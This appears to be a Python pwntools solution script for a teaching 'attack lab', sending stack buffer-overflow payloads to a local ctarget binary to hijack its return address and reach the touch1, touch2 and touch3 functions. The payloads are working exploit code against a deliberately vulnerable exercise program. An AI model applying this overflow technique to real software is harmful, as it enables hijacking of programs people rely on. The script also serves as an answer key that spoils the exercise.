from pwn import *
# context.log_level = 'debug'

touch1_payload = 'a' * 0x28 + p64(0x4017C0)
p = process(argv=['./ctarget', "-q"])
p.recv()
# gdb.attach(p, "b*0x4017AF")
p.sendline(touch1_payload)
print p.recv()
p.close()

touch2_payload = 'a' * 0x28 + p64(0x40141b) + p64(0x59b997fa) + p64(0x4017EC)
p = process(argv=['./ctarget', "-q"])
p.recv()
# gdb.attach(p, "b*0x4017AF")
p.sendline(touch2_payload)
print p.recv()
p.close()

touch3_payload = 'a' * 0x28 + p64(0x40141b) + p64(0x5561dc23) + p64(0x4018FA)
p = process(argv=['./ctarget', "-q"])
p.recv()
# gdb.attach(p, "b*0x4018FA")
p.sendline(touch3_payload)
print p.recv()
p.close()